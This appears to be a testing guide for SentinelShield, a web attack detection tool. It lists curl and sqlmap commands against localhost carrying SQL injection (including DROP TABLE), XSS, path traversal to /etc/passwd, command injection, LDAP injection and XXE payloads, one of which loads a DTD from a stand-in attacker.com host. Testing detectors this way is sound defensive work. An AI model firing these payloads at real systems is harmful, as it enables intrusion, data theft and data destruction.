# SentinelShield - Kali Linux Terminal Testing Commands

This document provides ready-to-use terminal commands for testing SentinelShield on Kali Linux.

## Quick Start Commands

### 1. Initial Setup
```bash
# Clone repository
git clone https://github.com/gauravmalhotra3300-hub/SentinelShield.git
cd SentinelShield

# Install dependencies
pip install -r requirements.txt

# Verify installation
python --version
pip list | grep pytest
```

### 2. Run All Tests (Automated)
```bash
# Run all tests with verbose output
python -m pytest tests/ -v

# Run tests with summary
python -m pytest tests/ --tb=short

# Run tests with coverage
pip install coverage
python -m pytest tests/ --cov=src --cov-report=term-missing
```

### 3. Run Individual Test Suites
```bash
# Test attack payload detection
python -m pytest tests/test_attack_payloads.py -v

# Test security features
python -m pytest tests/test_comprehensive_security.py -v

# Test normal requests
python -m pytest tests/test_normal_requests.py -v
```

## SQL Injection Testing Commands

### Basic SQL Injection Tests
```bash
# Test 1: Classic SQL Injection
curl -X GET "http://localhost:5000/test?id=1' OR '1'='1"

# Test 2: DROP TABLE Attack
curl -X GET "http://localhost:5000/test?id=1; DROP TABLE users--"

# Test 3: UNION-based Injection
curl -X GET "http://localhost:5000/test?id=1 UNION SELECT NULL, NULL, NULL--"

# Test 4: Blind SQL Injection
curl -X GET "http://localhost:5000/test?id=1 AND 1=1"
curl -X GET "http://localhost:5000/test?id=1 AND 1=2"

# Test 5: Time-based Blind SQLi
curl -X GET "http://localhost:5000/test?id=1'; WAITFOR DELAY '00:00:05'--"
```

### SQLMap Integration
```bash
# Basic SQLMap scan
sqlmap -u "http://localhost:5000/test?id=1" --dbs

# Aggressive SQLMap scan
sqlmap -u "http://localhost:5000/test?id=1" -p id --dbs --risk=3 --level=5

# Extract table data
sqlmap -u "http://localhost:5000/test?id=1" -D database_name -T table_name --dump
```

## XSS (Cross-Site Scripting) Testing Commands

### Reflected XSS Tests
```bash
# Test 1: Basic script injection
curl -X GET "http://localhost:5000/search?q=<script>alert('XSS')</script>"

# Test 2: Event handler XSS
curl -X GET "http://localhost:5000/test?input=<img src=x onerror=alert('XSS')>"

# Test 3: SVG-based XSS
curl -X GET "http://localhost:5000/test?input=<svg onload=alert('XSS')>"

# Test 4: HTML attribute injection
curl -X GET "http://localhost:5000/test?input=' onmouseover='alert(1)'"

# Test 5: Data URI XSS
curl -X GET "http://localhost:5000/test?input=<iframe src=data:text/html,<script>alert(1)</script>>"
```

## Path Traversal / LFI Testing Commands

### Directory Traversal Tests
```bash
# Test 1: Basic path traversal
curl -X GET "http://localhost:5000/file?path=../../etc/passwd"

# Test 2: URL encoded traversal
curl -X GET "http://localhost:5000/file?path=..%2F..%2Fetc%2Fpasswd"

# Test 3: Double encoded
curl -X GET "http://localhost:5000/file?path=..%252F..%252Fetc%252Fpasswd"

# Test 4: Null byte injection
curl -X GET "http://localhost:5000/file?path=../../etc/passwd%00.txt"

# Test 5: Unicode encoding
curl -X GET "http://localhost:5000/file?path=..%c0%af..%c0%afetc%c0%afpasswd"
```

## Command Injection Testing Commands

### OS Command Tests
```bash
# Test 1: Command chaining with semicolon
curl -X GET "http://localhost:5000/execute?cmd=ls;whoami"

# Test 2: Pipe command
curl -X GET "http://localhost:5000/execute?cmd=cat /etc/passwd | grep root"

# Test 3: AND operator
curl -X GET "http://localhost:5000/execute?cmd=id && whoami"

# Test 4: OR operator
curl -X GET "http://localhost:5000/execute?cmd=invalid_command || whoami"

# Test 5: Command substitution
curl -X GET "http://localhost:5000/execute?cmd=echo $(whoami)"
```

## Rate Limiting Testing Commands

### Simple Rate Limiting Tests
```bash
# Test 1: Send rapid requests
for i in {1..50}; do curl http://localhost:5000/api/test; done

# Test 2: Parallel requests
parallel curl ::: http://localhost:5000/api/test{1..50}

# Test 3: Timed rate limiting
while true; do curl -w "\n%{time_total}\n" http://localhost:5000/api/test; sleep 0.1; done

# Test 4: Apache Bench for load testing
ab -n 1000 -c 10 http://localhost:5000/api/test

# Test 5: weighttp for parallel connections
weihttp -n 1000 -c 100 -t 4 http://localhost:5000/api/test
```

## LDAP Injection Testing Commands

```bash
# Test 1: Basic LDAP injection
curl -X GET "http://localhost:5000/ldap?user=*"

# Test 2: LDAP filter bypass
curl -X GET "http://localhost:5000/ldap?user=admin*)(|(uid="

# Test 3: Blind LDAP injection
curl -X GET "http://localhost:5000/ldap?user=admin*"
```

## XXE (XML External Entity) Testing Commands

```bash
# Test 1: Basic XXE
curl -X POST http://localhost:5000/xml -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# Test 2: XXE with parameter entity
curl -X POST http://localhost:5000/xml -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><root/>' 
```

## Normal Request Testing (Valid Traffic)

```bash
# Test 1: Simple GET request
curl -X GET "http://localhost:5000/index"

# Test 2: POST with form data
curl -X POST http://localhost:5000/api/user -d "username=john&password=123456"

# Test 3: POST with JSON
curl -X POST http://localhost:5000/api/user -H "Content-Type: application/json" -d '{"username":"john","password":"123456"}'

# Test 4: Request with custom headers
curl -X GET "http://localhost:5000/test" -H "User-Agent: Mozilla/5.0" -H "Accept: application/json"

# Test 5: Request with cookies
curl -X GET "http://localhost:5000/test" --cookie "session_id=abc123"
```

## Burp Suite Integration Commands

```bash
# Start Burp Suite in headless mode
burpsuite --project-file=sentinelshield.burp --headless

# Use Burp's REST API (if enabled)
curl -X POST http://localhost:1337/v0.1/scan -d '{"baseRequestResponse": {"request": "..."}}'
```

## OWASP ZAP Integration Commands

```bash
# Basic ZAP scan
zaproxy -config api.disablekey=true -cmd -quickurl http://localhost:5000

# Full scan with reporting
zaproxy -config api.disablekey=true -cmd \
  -quickurl http://localhost:5000 \
  -quickout /tmp/zap-report.html

# Scan with custom rules
zaproxy -config api.disablekey=true -cmd \
  -quickurl http://localhost:5000 \
  -script /path/to/custom-script.js
```

## Monitoring and Logging Commands

```bash
# Monitor application logs in real-time
tail -f /tmp/sentinelshield.log

# Search for attack attempts
grep -i "attack\|injection\|payload" /tmp/sentinelshield.log

# Count detection events
grep -c "ALERT" /tmp/sentinelshield.log

# Monitor system resources during testing
top -b -n 1 | head -20

# Check network connections
netstat -tulpn | grep 5000

# Monitor with htop (better interface)
htop

# Watch command for continuous monitoring
watch -n 1 'netstat -tulpn | grep 5000'
```

## System Analysis Commands

```bash
# Check Python version
python --version

# List installed packages
pip list

# Check disk space
df -h

# Check memory usage
free -h

# View network configuration
ifconfig
ipconfig

# Check listening ports
sudo lsof -i -P -n

# Monitor network traffic
sudo tcpdump -i eth0 -n port 5000
```

## Performance Testing Commands

```bash
# Measure response time
time curl http://localhost:5000/test?id=1

# Get detailed timing information
curl -w "@- " -o /dev/null -s http://localhost:5000/test?id=1 <<'EOF'
Connect Time: %{time_connect}\n
Time to First Byte: %{time_starttransfer}\n
Total Time: %{time_total}\n
EOF

# Apache Bench with specific concurrency
ab -n 5000 -c 50 http://localhost:5000/test?id=1

# Create concurrent connections
parallel -j 100 curl ::: http://localhost:5000/test?id=1{1..100}
```

## Quick Test Sequence

Run this sequence to quickly test SentinelShield:

```bash
#!/bin/bash
echo "=== SentinelShield Quick Test ==="

echo "\n1. Running automated test suite..."
python -m pytest tests/ -v

echo "\n2. Testing SQL Injection detection..."
curl "http://localhost:5000/test?id=1' OR '1'='1"

echo "\n3. Testing XSS detection..."
curl "http://localhost:5000/search?q=<script>alert('XSS')</script>"

echo "\n4. Testing path traversal detection..."
curl "http://localhost:5000/file?path=../../etc/passwd"

echo "\n5. Testing command injection detection..."
curl "http://localhost:5000/execute?cmd=ls;whoami"

echo "\n=== Test Complete ==="
```

Save as `quick_test.sh` and run:
```bash
chmod +x quick_test.sh
./quick_test.sh
```

## Tips and Tricks

- Use `-v` flag with curl to see request and response headers
- Use `--trace` with curl for complete protocol trace
- Pipe curl output to `tee` to save results: `curl ... | tee output.txt`
- Use `watch` command to repeat commands: `watch -n 1 'curl http://...'
- Use `seq` for loops: `for i in $(seq 1 100); do curl ...; done`
- Combine commands with `&&` for sequential execution
- Use `|` pipe for output processing
- Save responses to files: `curl -o response.txt http://...`

---

**Note**: These commands are for authorized security testing only. Use responsibly and legally.
